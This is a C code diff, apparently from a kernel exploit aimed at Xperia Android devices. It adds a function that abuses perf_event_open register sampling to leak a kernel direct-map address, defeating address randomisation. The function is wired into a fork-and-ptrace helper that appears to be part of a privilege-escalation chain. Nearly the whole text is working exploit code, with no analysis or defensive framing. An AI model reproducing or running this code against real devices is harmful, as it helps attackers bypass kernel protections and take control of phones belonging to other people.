@@ -980,7 +980,7 @@ uintptr_t fp_helper_setup(uintptr_t value, uintptr_t target, pid_t *out_pid) {
   *sh = 0;
   pid_t c = fork();
   if (c == 0) {
-    uint64_t dm = perf_find_task();
+    uint64_t dm = perf_task_dm_leak();
     *sh = dm;
     if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) _exit(3);
     raise(SIGSTOP);
@@ -1049,3 +1049,77 @@ uintptr_t fp_helper_setup(uintptr_t value, uintptr_t target, pid_t *out_pid) {
 #ifndef PTRACE_SETREGSET
 #define PTRACE_SETREGSET 0x4205
 #endif
+
+
+// === Xperia perf_task_dm_leak (DM adresi icin) ===
+uint64_t perf_task_dm_leak(void) {
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.size = sizeof(pe);
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  pe.sample_period = 5000;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = (1ULL << 32) - 1;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+  errno = 0;
+  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (fd < 0) {
+    pr_warning("fp perf: perf_event_open errno=%d\n", errno);
+    return 0;
+  }
+  size_t data = 4096 * 32, ring = 4096 + data;
+  struct perf_event_mmap_page *hdr =
+      mmap(NULL, ring, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (hdr == MAP_FAILED) { close(fd); return 0; }
+  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+  hdr->data_head = hdr->data_tail = 0;
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (int i = 0; i < 200000; i++) syscall(__NR_getpid);
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+  char *base = (char *)hdr + 4096;
+  uint64_t head = hdr->data_head; __sync_synchronize();
+  uint64_t tail = hdr->data_tail;
+  pr_info("fp perf: raw head=%lu tail=%lu\n", (unsigned long)head, (unsigned long)tail);
+  static uint64_t vals[4096], cand[4096];
+  int n = 0;
+  while (tail < head && n < 4096) {
+    struct perf_event_header *eh =
+        (struct perf_event_header *)(base + (tail % data));
+    if (!eh->size) break;
+    if (eh->type == PERF_RECORD_SAMPLE) {
+      char *s = (char *)eh + sizeof(*eh);
+      uint64_t abi;
+      memcpy(&abi, s + 8, 8);
+      if (abi == 1 || abi == 2) {
+        uint64_t *regs = (uint64_t *)(s + 16);
+        for (int r = 0; r < 32; r++) {
+          uint64_t v = regs[r];
+          if (v >= P0_PAGE_OFFSET && v < DIRECT_MAP_END && (v & 7) == 0) {
+            cand[n++] = v;
+            break;  /* one DM value per sample */
+          }
+        }
+      }
+    }
+    tail += eh->size;
+  }
+  munmap(hdr, ring);
+  close(fd);
+  if (n == 0) return 0;
+  uint64_t best = 0;
+  int best_cnt = 0;
+  for (int i = 0; i < n; i++) {
+    int c = 0;
+    for (int j = 0; j < n; j++) if (cand[j] == cand[i]) c++;
+    if (c > best_cnt) { best_cnt = c; best = cand[i]; }
+  }
+  for (int i = 0; i < n; i++) vals[i] = cand[i];
+  pr_info("fp perf: samples=%d best=%016llx votes=%d\n", n,
+          (unsigned long long)best, best_cnt);
+  if (best_cnt < 16) return 0;
+  return best;
+}
